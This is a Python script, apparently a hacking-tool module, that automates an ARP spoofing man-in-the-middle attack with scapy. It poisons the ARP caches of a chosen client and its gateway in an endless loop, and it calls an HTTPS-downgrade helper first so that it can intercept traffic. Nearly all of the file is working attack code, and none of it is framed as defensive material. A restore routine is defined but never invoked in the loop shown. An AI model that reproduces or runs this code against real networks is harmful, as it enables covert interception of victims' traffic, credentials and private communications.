#!/usr/bin/env python3

"""
Accepts as input a target client IP and gateway IP. Automates an
ARP Spoof whereby the controller is established as the MITM, or 
intermediary entity between the given client/gateway. Port-forwarding
is auto-enabled, and both client and gateway ARP tables are reset
upon user-termination.
"""
import time
import sys
import subprocess
from subprocess import Popen
import scapy.all as scapy

from utils.downgrade_https import downgrade_https

class Spoofer:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.resolve_mac_from_ip(self.target_ip)
        self.gateway_mac = self.resolve_mac_from_ip(self.gateway_ip)
        
    def resolve_mac_from_ip(self, ip_address):
        """
        Accepts as input an IP address, resolves its corresponding MAC address,
        and returns said MAC address.
        """
        arp_request = scapy.ARP(pdst=ip_address)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        acknowledged_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        return acknowledged_list[0][1].hwsrc
        
    def spoof(self, target_ip, spoof_ip, target_ip_mac):
        """
        Accepts as input the target IP and the spoof IP.
        Sends packets to manipulate the target's
        IP tables to associate the controller with the spoof IP.
        """
        arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_ip_mac, psrc=spoof_ip)
        scapy.send(arp_response_packet, verbose=False)

    def restore_defaults(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """
        Restores target(s) ARP tables.
        """
        arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        scapy.send(arp_packet, count=4, verbose=False)

    def run(self):
        downgrade_https()
        sent_packets_count = 0
        while True:
            self.spoof(self.target_ip, self.gateway_ip, self.target_mac) # client, I am the router
            self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac) # router, I am the client
            sent_packets_count += 2
            print(f"\r[+] Transaction successful. Packets sent: {str(sent_packets_count)}", end="")
            #python2 print("\r[+] Transaction successful. Packets sent: " + str(sent_packets_count)),
            sys.stdout.flush()
            time.sleep(2)



   